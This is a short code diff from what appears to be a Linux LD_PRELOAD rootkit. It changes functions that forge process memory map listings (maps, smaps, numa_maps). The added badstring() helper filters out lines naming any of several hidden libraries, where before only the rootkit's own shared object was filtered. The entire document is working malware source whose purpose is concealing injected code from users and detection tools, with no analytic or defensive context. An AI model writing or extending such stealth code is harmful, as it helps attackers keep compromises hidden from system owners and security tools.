@@ -1,3 +1,12 @@
+char *badstring(char *buf){
+    char *ret = NULL;
+    for(int i=0; i != sizeofarr(bads); i++){
+        ret = strstr(buf, bads[i]);
+        if(ret) break;
+    }
+    return ret;
+}
+
 FILE *forge_maps(const char *pathname){
     FILE *o = tmpfile(), *pnt;
     char buf[LINE_MAX];
@@ -9,10 +18,9 @@ FILE *forge_maps(const char *pathname){
     }
 
     while(fgets(buf, sizeof(buf), pnt) != NULL)
-        if(!strstr(buf, BDVLSO))
+        if(!badstring(buf))
             fputs(buf, o);
 
-    memset(buf, 0, strlen(buf));
     fclose(pnt);
     fseek(o, 0, SEEK_SET);
     return o;
@@ -32,11 +40,10 @@ FILE *forge_smaps(const char *pathname){
     while(fgets(buf, sizeof(buf), pnt) != NULL){
         if(i > 0) i++;
         if(i > 15) i = 0;
-        if(strstr(buf, BDVLSO)) i = 1;
+        if(badstring(buf)) i = 1;
         if(i == 0) fputs(buf, o);
     }
 
-    memset(buf, 0, strlen(buf));
     fclose(pnt);
     fseek(o, 0, SEEK_SET);
     return o;
@@ -53,10 +60,9 @@ FILE *forge_numamaps(const char *pathname){
     }
 
     while(fgets(buf, sizeof(buf), pnt) != NULL)
-        if(!strstr(buf, BDVLSO))
+        if(!badstring(buf))
             fputs(buf, o);
 
-    memset(buf, 0, strlen(buf));
     fclose(pnt);
     fseek(o, 0, SEEK_SET);
     return o;
